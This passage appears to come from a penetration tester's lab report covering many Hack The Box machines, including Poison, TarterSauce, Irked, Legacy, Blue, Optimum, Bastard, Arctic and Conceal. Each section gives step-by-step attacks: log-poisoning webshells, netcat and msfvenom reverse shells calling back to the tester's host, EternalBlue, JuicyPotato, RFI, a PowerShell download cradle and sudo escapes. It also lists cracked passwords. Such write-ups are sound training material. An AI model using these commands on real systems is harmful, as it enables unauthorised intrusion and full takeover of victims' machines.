4. I next injected the following PHP code into the access log, preceded by a marker for me to find it easily, by injecting it into the User Agent string using Burpsuite's repeater.

   ```php
   ****COYOTE_LOG**** <?php echo shell_exec($_GET['cmd']);?>
   ```

   ![image-20201105115826550](.Report.assets/image-20201105115826550.png)
   In order to verify this code was inserted properly, I loaded the page as base64 and decoded it to see the PHP code was successfully inject.

   ```http
   view-source:http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=/var/log/httpd-access.log
   ```

   ![image-20201105115917624](.Report.assets/image-20201105115917624.png)

5. With the code injected, I tested the page to make sure I could execute commands using this code:

   ```http
   http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=id
   ```

   ![image-20201105120035354](.Report.assets/image-20201105120035354.png)

6. I started a listener on Kali and used the injected PHP code to start a reverse shell from the target.  I had to use a combination of commands because the netcat installed on here doesn't support executing commands on connection:

   ```http
   # Non-URL encoded version
   http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.37 8001 >/tmp/f
   
   # URL Encoded
   http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%37%20%38%30%30%31%20%3e%2f%74%6d%70%2f%66
   ```

   ![image-20201105170852337](.Report.assets/image-20201105170852337.png)

7. On enumerating the listening ports, I found that it was listening locally on ports 5901 and 5801 with Xvnc as the root user.  At this point, I must use the charrix account I found earlier to forward these ports to Kali Linux.  From Kali Linux, I use local port forwarding:

   ```bash
   sudo ssh -N -L 5901:127.0.0.1:5901 charix@10.10.10.84
   ```

8. On trying to connect using xvncviewer, I was prompted with a password.  So I checked charrix's folder on the target to find a secret.zip file.
   ![image-20201105182535746](.Report.assets/image-20201105182535746.png)

9. I extracted this file using charix's password to get a file named secret that appeared to hold some garbage text.  I used this file as the password file and was able to connect through XVNC to the target as root.

   ```bash
   xvncviewer -passwd secret 127.0.0.1::5901
   ```

   ![image-20201105182624275](.Report.assets/image-20201105182624275.png)

10. Using this prompt, I was able to view the contents of the user.txt and root.txt files:
    ![image-20201105182657935](.Report.assets/image-20201105182657935.png)
    user.txt: eaacdfb2d141b72a589233063604209c
    root.txt: 716d04b188419cf2bb99d891272361f5

### 10.10.10.88 - TarterSauce

1. After the initial nmap scans, I found a web server running on the target and directory scanning the website uncovered the robots.txt file at http://10.10.10.88/robots.txt.  This file revealed the http://10.10.10.88/webservices/monstra-3.0.4/ site, which had an admin login.  I attempted a few logins and was able to get in with `admin/admin`
   ![image-20201105200042667](.Report.assets/image-20201105200042667.png)

2. Monstra 3.0.4 has a vulnerability that allows arbitrary file upload and RCE (https://www.exploit-db.com/exploits/43348), but something is broken with this installation and I was not able to perform this exploit.

3. I did further scanning of the webservices folder and discovered the URL http://10.10.10.88/webservices/wp/.  I used wpscan to enumerate the plugins for this site:

   ```bash
   wpscan --url http://10.10.10.88/webservices/wp --enumerate p --plugins-detection aggressive
   ```

   ![image-20201105205754983](.Report.assets/image-20201105205754983.png)

4. The plugin gwolle-gb was showing version 2.3.10 in the scan, but examining the scan's source showed the author had modified the changelog file to trick scans, so the actual version was 1.5.3: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt

   ![image-20201105205840394](.Report.assets/image-20201105205840394.png)

5. This version of gwolle-gb has a remote file inclusion vulnerable (CVE CVE-2015-8351) which I was able to verify by visiting this URL and seeing the target contact my webserver, but I noticed it was appending 'wp-load.php' to the end of the URL:

   ```bash
   curl http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.37/test.txt
   ```

   ![image-20201105210348515](.Report.assets/image-20201105210348515.png)

6. I started a netcat listener, created a shell file called wp-load.php using Pentest Monkey's php-reverse-shell.php script, and hosted in on a webserver on Kali.  Then I used the RFI again to pull the file from my webserver on Kali to get a reverse shell as the www-data user:

   ```bash
   curl http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.37/
   ```

   ![image-20201105210700936](.Report.assets/image-20201105210700936.png)

7. I found that the user www-data had permissions to run /bin/tar as the user onuma.  It is possible to spawn a shell using the tar command, so I combined this with sudo to spawn a shell as the onuma user:

   ```bash
   sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
   ```

8. After further enumeration, I found a log at  `/var/backups/onuma_backup_test.txt` that had output of a recently run program called backuperer.  I searched for this program and found it in /usr/sbin/backuperer.
   ![image-20201106130050230](.Report.assets/image-20201106130050230.png)

9. Examining this program, I found that it was running as root, making a backup of /var/www/html as the user onuma, then it would pause for 30 seconds.  It would then extract the backup as root to /tmp/var/check and diff the folder with the original to make sure it ran correctly.  If so, it deleted the check folder, but if not, left the check folder there until it was deleted on the next cycle.

10. Because the backup file was created as the onuma user, I took advantage of that 30 second window.  I first transferred the 32-bit bash binary from the target to my Kali machine (since my bash is 64-bit).  I changed the owner of the file to root and gave it SUID permissions.  Then I created the folder var/www/html and put the bash file in it, just to mirror the setup on the target, and then tar.gz-ipped the var/ directory. 

    ```bash
    chown root: bash
    chmod 4755 bash
    tar -czvf suidbash32.tar.gz ./var
    ```

11. I hosted this gz file on my webserver and downloaded it from the target.  I then waited for my 30 second window after the backup script had run to overwrite the created backup archive with my malicious suidbash32 archive.  After doing so, the root user unzipped the file which preserved the SUID bit on it.

12. Getting a root shell was simply a matter of running the bash binary as the effective user:

    ```bash
    /var/tmp/check/var/www/html/bash -p
    ```

    ![image-20201106130859476](.Report.assets/image-20201106130859476.png)

13. From this prompt I was able to view the contents of user.txt and root.txt:
    ![image-20201106124407047](.Report.assets/image-20201106124407047.png)
    user.txt: b2d6ec45472467c836f253bd170182c7
    root.txt: e79abdab8b8a4b64f8579a10b2cd09f9

### 10.10.10.76 - Sunday

1. After initial enumeration, I found that the finger service was open.  I used this to enumerate users on the box and found the users `sammy` and `sunny`, in addition to some service users and root.
   ![image-20201107195407815](.Report.assets/image-20201107195407815.png)

2. Guessing some passwords using the usual (admin,password,name of the host) gave me SSH access as sunny with the password `sunday`

   ```bash
   ssh -p 22022 sunny@10.10.10.76 -oKexAlgorithms=diffie-hellman-group1-sha1
   ```

   ![image-20201107195513896](.Report.assets/image-20201107195513896.png)

3. I checked sunny's sudo permissions to find I was able to run /root/troll as root, which just prints the suid/gid of root.
   ![image-20201107203104075](.Report.assets/image-20201107203104075.png)

4. I found a dump of the /etc/shadow file in /backup/shadow.backup.  I cracked the hash for sammy to find the password was `cooldude!`
   ![image-20201107202346084](.Report.assets/image-20201107202346084.png)

   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   ```

   ![image-20201107202416199](.Report.assets/image-20201107202416199.png)

5. On logging in and checking sammy's sudo permissions, I found I was able to run wget as root.  On Kali, I created a simple bash script to run the bash command, then I hosted it on my Kali webserver.  I downloaded this script using sudo and wget and overwrote /root/troll with it.  Then I quickly ran that script using sudo as the user sunny to get a root bash shell.
   ![image-20201107203347442](.Report.assets/image-20201107203347442.png)

6. From this root shell, I was able to list the contents of the user.txt and root.txt files.
   ![image-20201107204516502](.Report.assets/image-20201107204516502.png)
   user.txt: a3d9498027ca5187ba1793943ee8a598
   root.txt: fb40fab61d99d37536daeec0d97af9b8

7. This box kept losing network connectivity every 20 seconds or so and would stay down almost a minute.  This was the most irritating box and I finally gave up trying to enumerate and just followed the walkthrough just so I could get the flags and rate the box 1 star.

### 10.10.10.117 - Irked

1. Initial scans revealed this target was running unreal IRCd on three ports.  I used nmap to see if this version was vulnerable to CVE-2010-2075, and it was:  

   ```bash
   nmap --script irc-unrealircd-backdoor.nse 10.10.10.117 -p 6697
   ```

   ![image-20201108125230795](.Report.assets/image-20201108125230795.png)

2. I started a netcat listener on Kali and used this backdoor to trigger a reverse shell as user ircd:

   ```bash
   echo "AB;nc -e /bin/sh 10.10.14.37 8001" | nc 10.10.10.117 6697
   ```

   ![image-20201108124906640](.Report.assets/image-20201108124906640.png)

3. I checked the ircd user's .bash_history file and it showed the user had access the file /home/djmardov/Documents/.backup.  I examined this file and found a reference to steganography along with a passphrase.  Given there was only one image found on this target (irked.jpg on the webpage hosted on the server), I attempted to use this passphrase to decode the image on a steganography site and uncovered what appeared to be a password:  `Kab6h+m+bbp2J:HG`
   ![image-20201108131451347](.Report.assets/image-20201108131451347.png)

   ```bash
   steghide --extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
   ```

4. Enumerating /etc/passwd showed another user on the system, `djmardov`, the same user whose home folder I found the passphrase in.  I was able to login as this user using the password found inside the irked.jpg image.

   ![image-20201108134838988](.Report.assets/image-20201108134838988.png)

5. After getting access to the djmardov user, I realized it was completely pointless once I found a binary in /usr/bin/viewuser that had SUID privileges.  This binary tries to execute the binary /tmp/listusers, which is currently missing.  All I needed to do was copy /bin/bash to /tmp/listusers, then run /usr/bin/viewuser to get a root prompt.  I was able to do this as the ircd user as well as djmardov.
   ![image-20201108164352313](.Report.assets/image-20201108164352313.png)

6. From this root prompt, I was able to get access to the user.txt and root.txt files:
   ![image-20201108164455423](.Report.assets/image-20201108164455423.png)
   user.txt: 4a66a78b12dc0e661a59d3f5c0267a8e
   root.txt: 8d8e9e8be64654b6dccc3bff4522daf3

### 10.10.10.4 - Legacy

1. Initial enumeration scans found the server was running a version of SMB vulnerable to the EternalBlue exploit (CVE-2017-0143).
   ![image-20201108170832456](.Report.assets/image-20201108170832456.png)

2. I created a reverse shell payload for Windows that I planned to send using the EternalBlue exploit:

   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f exe -o win_revtcp_8000.exe
   ```

3. I modified the code of this (https://www.exploit-db.com/exploits/42315) EternalBlue exploit to upload and run my payload along with the whoami command to make sure I can check the user:
   ![image-20201108172332230](.Report.assets/image-20201108172332230.png)

4. To run the exploit above, I had to get a second module and put it in the same folder:

   ```bash
   wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
   ```

5. I started a netcat listener on Kali and ran the exploit to get a reverse shell as the system user:

   ```bash
   python 42315.py 10.10.10.4
   ```

   ![image-20201108172405723](.Report.assets/image-20201108172405723.png)

6. From this shell, I was able to list the contents of the user.txt and root.txt:
   ![image-20201108172828612](.Report.assets/image-20201108172828612.png)
   user.txt: e69af0e4f443de7e36876fda4ec7644f
   root.txt: 993442d258b0e0ec917cae9e695d5713

### 10.10.10.5 - Devel

1. Initial enumeration showed ftp and http were open on this server and that it was running IIS 7.5.

2. I tested the ftp server and had write access to the root folder, so I created an aspx reverse shell and uploaded it to the server:

   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f aspx -o shell.aspx
   ```

   ![image-20201108215921116](.Report.assets/image-20201108215921116.png)

3. I started a netcat listener and loaded the shellcode to initiate a reverse shell as the `iis apppool\web` user.

   ```http
   http://10.10.10.5/shell.aspx
   ```

   ![image-20201108220019315](.Report.assets/image-20201108220019315.png)

4. I checked the user's privileges and noticed it has the SeImpersonatePrivilege:
   ![image-20201108220208018](.Report.assets/image-20201108220208018.png)

5. I created a reverse shell payload for windows:

   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f exe -o win_revtcp_8000.exe
   ```
   
6. I transferred the 32-bit JuicyPotato exploit (obtained from here: https://github.com/ivanitlearning/Juicy-Potato-x86) and nc.exe to the target to take advantage of the SeImpersonatePrivilege and escalate privileges to SYSTEM.  I ran juicypotato with netcat to get a reverse shell as SYSTEM

   ```bash
   JuicyPotatox86.exe -l 1337 -p c:\coyote\nc.exe -a "-nv 10.10.14.37 8000 -e cmd.exe" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}
   ```

   ![image-20201109170536913](.Report.assets/image-20201109170536913.png)

7. From this shell, I was able to list the contents of the user.txt and root.txt files:
   ![image-20201109170705428](.Report.assets/image-20201109170705428.png)
   user.txt: 9ecdd6a3aedf24b41562fea70f4cb3e8
   root.txt: e621a0b5041708797c4fc4728bc72b4b

### 10.10.10.40 - Blue

1. Initial enumeration showed that SMB was open on this target and it was vulnerable to CVE-2017-0143, allowing remote code execution through SMB.
   ![image-20201109201731665](.Report.assets/image-20201109201731665.png)
   
2. I tried the zzz EternalBlue exploit from searchsploit but kept getting an error that no named pipes were found.  This meant I needed another approach, so  I used the exploit code from this page (https://github.com/worawit/MS17-010.git) which did not require named pipes because it included some kernel shellcode.

3. I compiled the kernel shellcode from the package above:

   ```bash
   nasm -f bin ~/opt/exploits/eternalblue/MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
   ```

4. I then created a reverse shell payload in msfvenom:

   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LPORT=8000 LHOST=10.10.14.37 --platform windows -a x64 --format raw -o sc_x64_payload.bin
   ```

5. I combined these two files together and then used that bin with the exploit launcher to get a reverse shell as SYSTEM:

   ```bash
   cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
   python ~/opt/exploits/eternalblue/MS17-010/eternalblue_exploit7.py 10.10.10.40 sc_x64.bin
   ```

   ![image-20201111174240962](.Report.assets/image-20201111174240962.png)

6. From this prompt, I was able to view the contents of user.txt and root.txt:

   ![image-20201111171342439](.Report.assets/image-20201111171342439.png)
   user.txt: 4c546aea7dbee75cbd71de245c8deea9
   root.txt: ff548eb71e920ff6c08843ce9df4e717

### 10.10.10.8 - Optimum

1. Initial enumeration scans found a web server running Rejetto Http File Server 2.3.  This file server is vulnerable to RCE (CVE-2014-6287).  I found exploit code for this vulnerability here:  https://www.exploit-db.com/exploits/39161

2. I modified the IP and listening port in the script on lines 35 & 36 to point to my Kali IP and port 8000.  I also started up a webserver with nc.exe on it.  Then I ran the exploit, which downloaded nc.exe from my webserver and ran it to connect to my listener:

   ```bash
   python 39161.py 10.10.10.8 80
   ```

   ![image-20201111175632436](.Report.assets/image-20201111175632436.png)

3. I use winPEAS to enumerate the system, which found the cached password for the user kostas: `kdeEjDowkS*` 
   ![image-20201111180629331](.Report.assets/image-20201111180629331.png)

4. To escalate privileges, I found the system was vulnerable to MS16-032, so I used the script found here: https://www.exploit-db.com/exploits/39719 but I needed to modify it to spawn a reverse shell instead of opening another command prompt.

5. I generated a reverse shell executable and downloaded it onto the target:

   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f exe -o win_revtcp_8000.exe
   ```

6. I modified the following lines of the exploit code:

   ```powershell
   # Line 189
   0x00000002, "C:\coyote\win_revtcp_8000.exe", "",
   # Line 334
   0x00000002, "C:\coyote\win_revtcp_8000.exe", "",
   ```

7. I started a netcat listener, hosted the ps script on my webserver and tried to run the exploit by remotely sourcing it.  I ran into an issue where it kept saying  "No valid thread handle was captured, exiting!".  This turned out to be an issue where Windows was calling the 32-bit version of powershell, so I had to specify the path to the 64-bit version, which:

   ```powershell
   C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe -ExecutionPolicy Bypass -command "IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/39719.ps1'); Invoke-MS16-032; whoami"
   ```

   ![image-20201111211832286](.Report.assets/image-20201111211832286.png)

8. From this SYSTEM shell, I was able to list the contents of root.txt and user.txt:
   ![image-20201111211951398](.Report.assets/image-20201111211951398.png)
   user.txt: d0c39409d7b994a9a1389ebf38ef5f73
   root.txt: 51ed1b36553c8461f4552c2e92b3eeed

### 10.10.10.9 - Bastard

1. Initial enumeration scans found this was running a Drupal webserver, specifically version 7.54 which has several known vulnerabilities.  I tried a few and they did not appear to apply here, but this one did work, https://www.exploit-db.com/exploits/41564, which exploits the rest interface to read the admin session and get the session ID and name.

2. I modified a couple of lines of the code to match my target, specifically lines 31 and 32:

   ```php
   $url = 'http://10.10.10.9';
   $endpoint_path = '/rest';
   ```

   Then I ran the code to read the admin session details:
   ![image-20201112203255611](.Report.assets/image-20201112203255611.png)

   ```bash
   # Contents of session.json
   {
       "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
       "session_id": "jWxD-ieWYBiGYW8VrDQzNxb6aU_N-Sh3QHD06tseXWM",
       "token": "7OPsvRIkZhBHLlzhP6EC_GpbW0cbtGkdATafrwZvZe8"
   }
   ```

3. I used the session_name and session_id to forge a cookie in my web browser to assume an admin session, which gave me access to the admin portal of the Drupal site:
   ![image-20201112203447652](.Report.assets/image-20201112203447652.png)

4. From here, I was able to enable the 'PHP Filter' module (under the modules menu) and then create a post containing the code below, being sure to change the text format to PHP code so it would execute. 

   ```php
   <?php if (isset($_REQUEST['fupload'])) {
     file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.37:80/" . $_REQUEST['fupload']));
   };
   
   if (isset($_REQUEST['fexec'])) {
     echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
   };
   ?>
   ```

5. I ran commands against the script to download nc.exe to the target and run it to get a reverse shell as iusr

   ```bash
   curl http://10.10.10.9/thepage.php?fupload=nc.exe
   curl http://10.10.10.9/thepage.php?fexec=nc.exe+10.10.14.37+8000+-e+cmd.exe
   ```

   ![image-20201112212540916](.Report.assets/image-20201112212540916.png)

6. After enumerating, I found this server is Windows Server 2008 R2 Datacenter x64 and the user has the SeImpersonatePrivilege, so I used the JuicyPotato exploit (64-bit)  and the CLSID of the wuasuserv system account to spawn a new netcat shell as the SYSTEM user:

   ```powershell
   JuicyPotato.exe -l 1337 -p c:\coyote\nc.exe -a "-nv 10.10.14.37 8001 -e cmd.exe" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
   ```

   ![image-20201112214017863](.Report.assets/image-20201112214017863.png)

7. From this prompt, I was able to view the contents of the root.txt and user.txt files:
   ![image-20201112214304988](.Report.assets/image-20201112214304988.png)
   user.txt: ba22fde1932d06eb76a163d312f921a2
   root.txt: 4bf12b963da1b30cc93496f617f7ba7c

### 10.10.10.15 - Granny

1. Initial nmap enumeration scans showed this target was running IIS 6.0 on Windows 2003.  Some searching showed this version of IIS has a vulnerability allowing RCE (CVE-2017-7269).  I used the exploit code here to gain a reverse shell back to my Kali Linux machine as the user : https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269

   ```bash
   python ii6revshell.py 10.10.10.15 80 10.10.14.37 8000
   # It took about 10 seconds before the reverse shell triggered
   ```
   

![image-20201113205239156](.Report.assets/image-20201113205239156.png)

2. Windows 2003 has a vulnerability allowing the 'Network Service' service account to steal the SYSTEM token and execute commands as this user (CVE 2008-1436).  I used an FTP server on Kali and downloaded the exploit code here (https://github.com/Re4son/Churrasco) and nc.exe onto the target, then used the exploit to initiate a netcat session as the SYSTEM user:

   ```powershell
   churrasco -d "c:\coyote\nc.exe -nv 10.10.14.37 8000 -e cmd.exe"
   ```

   ![image-20201113213634846](.Report.assets/image-20201113213634846.png)

3. This shell would die after a couple of minutes but it stays up long enough to grab the user.txt and root.txt flags.  If I were really attacking this target, I could open port 445 through the firewall, get the admin hash and use PTH to connection, or create an admin user, open the port for RDP and enable it, then RDP to the machine.
   ![image-20201113213933101](.Report.assets/image-20201113213933101.png)
   user.txt: 700c5dc163014e22b3e408f8703f67d1
   root.txt: aa4beed1c0584445ab463a6747bd06e9

### 10.10.10.11 - Arctic

1. Initial nmap enumeration scans showed port 8500 was open but it was not sure what the port was running.  The target was running very slow, so this may have been the cause of the issue, but when I was able to load a webpage on that port which showed the target was running Cold Fusion.  I verified it was Cold Fusion 8 at this URL:  http://10.10.10.11:8500/cfdocs/dochome.htm

2. This version of ColdFusion has a path traversal vulnerability (CVE 2010-2861) which, according to this page (https://www.exploit-db.com/exploits/14641) allows the display of the admin password hash by visiting this URL:  http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en.  I was able to obtain this hash and identified it as a SHA1 hash.  Cracking the hash revealed the admin password was `happyday`.

   ```bash
   curl http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
   # Output password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
   
   # Identify Hash
   hashid hash.txt
   
   # Crack hash
   john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-SHA1
   ```

   ![image-20201114110654521](.Report.assets/image-20201114110654521.png)

3. Using this password, I was able to login to the admin console.  From here, I identified the path to the CFIDE folder on Windows: `C:\ColdFusion8\wwwroot\CFIDE\`
   ![image-20201114123514863](.Report.assets/image-20201114123514863.png)

4. Next, generated a JSP reverse shell payload and used the task scheduler to make the target download it to the CFIDE folder:

   ```bash
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f raw > rev_jsp_8000.jsp
   ```

   ![image-20201114124807840](.Report.assets/image-20201114124807840.png)

5. Opening the file through a URL triggered a reverse shell as the user tolis

   ```bash
   curl http://10.10.10.11:8500/CFIDE/rev_jsp_8000.jsp
   ```

   ![image-20201114124855859](.Report.assets/image-20201114124855859.png)

6. After enumerating, I found this server is Windows 2008 R2 x64 and the tolis user has SeImpersonatePrivilege on their account.  I used SMB to copy JuicyPotato.exe and nc.exe from Kali to the target and then ran it to create a new reverse shell as the SYSTEM user:

   ```bash
   copy \\10.10.14.37\coyote\winprivesc\JuicyPotato.exe c:\coyote\
   copy \\10.10.14.37\coyote\nc.exe c:\coyote\
   
   JuicyPotato.exe -l 1337 -p c:\coyote\nc.exe -a "-nv 10.10.14.37 8001 -e cmd.exe" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
   ```

   ![image-20201114125903067](.Report.assets/image-20201114125903067.png)

7. From this prompt, I was able to view the contents of the root.txt and user.txt files:
   ![image-20201114130035267](.Report.assets/image-20201114130035267.png)
   user.txt: 02650d3a69a70780c302e146a6cb96f3
   root.txt: ce65ceee66b2b5ebaff07e50508ffb90

### 10.10.10.14 - Grandpa

1. Initial nmap enumeration scans showed this target was running IIS 6.0 on Windows 2003.  Some searching showed this version of IIS has a vulnerability allowing RCE (CVE-2017-7269).  I used the exploit code here to gain a reverse shell back to my Kali Linux machine as the user : https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269

   ```bash
   python ii6revshell.py 10.10.10.14 80 10.10.14.37 8000
   # It took about 10 seconds before the reverse shell triggered
   ```

2. Windows 2003 has a vulnerability allowing the 'Network Service' service account to steal the SYSTEM token and execute commands as this user (CVE 2008-1436).  I used an FTP server on Kali and downloaded the exploit code here (https://github.com/Re4son/Churrasco) and nc.exe onto the target, then used the exploit to initiate a netcat session as the SYSTEM user:

   ```powershell
   churrasco -d "c:\coyote\nc.exe -nv 10.10.14.37 8000 -e cmd.exe"
   ```

   ![image-20201114162810674](.Report.assets/image-20201114162810674.png)

3. This shell would die after a couple of minutes but it stays up long enough to grab the user.txt and root.txt flags.  If I were really attacking this target, I could open port 445 through the firewall, get the admin hash and use PTH to connection, or create an admin user, open the port for RDP and enable it, then RDP to the machine.
   ![image-20201114163008026](.Report.assets/image-20201114163008026.png)
   user.txt: bdff5ec67c3cff017f2bedc146a5d869
   root.txt: 9359e905a2c35f861f6a57cecf28bb7b

### 10.10.10.82 - Silo

1. Initial nmap enumeration scans showed this target was running Oracle TNS listener 11.2.0.2.0.  I started by scanning the site with ODAT to discover the SID's XE and XEXDB.  Using the XE SID, I found credentials `scott/tiger`.
   ![image-20201114214534283](.Report.assets/image-20201114214534283.png)
   
2. Using these credentials and the ODAT tool, I am able to upload a file to the server and execute it.  So I created a reverse shell exectuable:

   ```bash
   msfvenom -p windows/shell_reverse_tcp LPORT=8000 LHOST=10.10.14.37 --platform wind
   ows -a x86 --format exe -o win_revtcp_8000.exe
   ```

3. Then I uploaded the exe to the target:

   ```bash
   odat utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ win_revtcp_8000.exe /home/coyote/htblab/oscp_like/82/win_revtcp_8000.exe
   ```

   ![image-20201115140914496](.Report.assets/image-20201115140914496.png)

4. Finally, I started a netcat listener and remotely executed the executable to get a reverse shell as SYSTEM:

   ````bash
   odat externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ win_revtcp_8000.exe
   ````

   ![image-20201115141030190](.Report.assets/image-20201115141030190.png)

5. From this prompt, I was able to view the contents of the root.txt and user.txt files:
   ![image-20201115141133411](.Report.assets/image-20201115141133411.png)
   user.txt: 92ede778a1cc8d27cb6623055c331617
   root.txt: cd39ea0af657a495e33bc59c7836faf6

### 10.10.10.93 - Bounty

1. Initial enumeration with nmap discovered a web server with a file upload form.  This form restricted the file uploads to specific file extensions, mainly image files, but I found that it accepted web.config as a file as well.
   ![image-20201116194228937](.Report.assets/image-20201116194228937.png)

2. I used the iiss.config file found here (https://gist.github.com/gaitonde-bhau/8e1e46f005415a5bf20dcbd28129534a) as my web.config file.  It has embedded aspx code that provides an interface to execute commands on the target.  I noticed that periodically this file would disappear from the server, so I had to re-upload it when I received a 404 error.  I used this to determine the server is running Windows Server 2008 R2 x64.
   ![image-20201116201454805](.Report.assets/image-20201116201454805.png)

3. I created a reverse shell executable and served it up on an SMB server on Kali, then I used this web.config form to copy it to the server:

   ```bash
   msfvenom -p windows/shell_reverse_tcp LPORT=8000 LHOST=10.10.14.37 --platform w
   indows -a x86 --format exe -o win_revtcp_8000.exe
   ```

   ![image-20201116201703393](.Report.assets/image-20201116201703393.png)

4. Finally, I started a netcat listener and used the web.config form to run my exe from above to get a reverse shell as the merlin user:
   ![image-20201116201817696](.Report.assets/image-20201116201817696.png)

5. I checked the user's privileges and saw it has the seimpersonate privilege, providing an opportunity for juicypotato.  I started a netcat listener and used SMB to transfer the juicypotat to the target and then used it to re-run my reverse shell exe to get a reverse shell as SYSTEM:

   ```powershell
   copy \\10.10.14.37\coyote\JuicyPotato.exe c:\users\public\
   
   c:\users\public\JuicyPotato.exe -l 1337 -p c:\users\public\win_revtcp_8000.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
   ```

   ![image-20201116202404165](.Report.assets/image-20201116202404165.png)

6. From this shell, I was able to view the contents of the root.txt and user.txt files:
   ![image-20201116202514690](.Report.assets/image-20201116202514690.png)
   user.txt:  e29ad89891462e0b09741e3082f44a2f
   root.txt:  c837f7b699feef5475a0c079f9d4f5ea

### 10.10.10.95 - Jerry

1. Initial scans discovered a webserver running on port 8080.  I found no interesting folders, but a Nikto scan found the site was using default credentials of `admin/s3cret`.  
   ![image-20201120161913639](.Report.assets/image-20201120161913639.png)

2. Using these default credentials, I was able to login to the site manager
   ![image-20201120161951515](.Report.assets/image-20201120161951515.png)

3. I created a reverse tcp shell payload in `war` format and uploaded it to the site using the manager interface:

   ```bash
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.37 LPORT=8000 -f war -o shell.war
   ```

   ![image-20201120162141113](.Report.assets/image-20201120162141113.png)

4. I started a netcat listener and visited the page to get a reverse shell as SYSTEM:
   ![image-20201120163350564](.Report.assets/image-20201120163350564.png)

5. From this shell, I was able to view the contents of the root.txt and user.txt files:
   ![image-20201120163847079](.Report.assets/image-20201120163847079.png)
   user.txt: 7004dbcef0f854e0fb401875f26ebd00
   root.txt: 04a8b36e1545a455393d067e772fe90e

### 10.10.10.116 - Conceal

1. Initial enumeration scans revealed on TCP ports open, but showed ports 161 for SNMP and 500 with an IKE tunnel open.  

2. Performing an SNMP walk of the target disclosed an NTLM hash of the PSK for the VPN:
   ![image-20201120200506404](.Report.assets/image-20201120200506404.png)

3. Cracking this hash revealed the VPN password was `Dudecake1!`

   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt vpnhash.txt --format=NT
   ```

   ![image-20201120200551515](.Report.assets/image-20201120200551515.png)

4. I enumerated the VPN connection settings using iker:

   ```bash
   sudo ike-scan -M 10.10.10.116
   
   # Setings
   Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080
   ```

   ![image-20201120200647241](.Report.assets/image-20201120200647241.png)

5. To create the VPN connection, I added the PSK to my Kali machine:

   ```bash
   sudo vi /etc/ipsec.secrets
   # Added this:
   10.10.10.116 : PSK "Dudecake1!"
   ```

   Then I created a vpn setup file for the connection using the settings discovered above:

   ```bash
   sudo vi /etc/ipsec.conf
   # Added these lines
   conn Conceal
       type=transport
       keyexchange=ikev1
       right=10.10.10.116
       authby=psk
       rightprotoport=tcp
       leftprotoport=tcp
       esp=3des-sha1
       ike=3des-sha1-modp1024
       auto=start
   ```

6. I stopped and started the ipsec service to establish the tunnel:

   ```bash
   sudo ipsec stop
   sudo ipsec start --nofork
   ```

   ![image-20201120201758533](.Report.assets/image-20201120201758533.png)

7. With greater visibility into the server, I started new nmap scans, being sure to use TCP Connect scans (-sT) since they are being encapsulated in the VPN.  I found an anonymous FTP server and a webserver.  On scanning the webserver, I found the folder http://10.10.10.116/upload and tested to see if it was linked to the ftp server.  I found that uploading files to the ftp server made them show up in the upload folder.

8. I use the laudanum asp webshell because I couldn't get an asp reverse shell to work.  I modified what IP can access the webshell on line 46 and used the FTP server to upload it to the website.  
   ![image-20201120215920367](.Report.assets/image-20201120215920367.png)

9. Next, I prepared a copy of Nishang's Invoke-PowershellTcp.ps1 script and inserted the following command at the bottom to cause the script to automatically connect to my Kali Machine:

   ```powershell
   # shell.ps1 addition
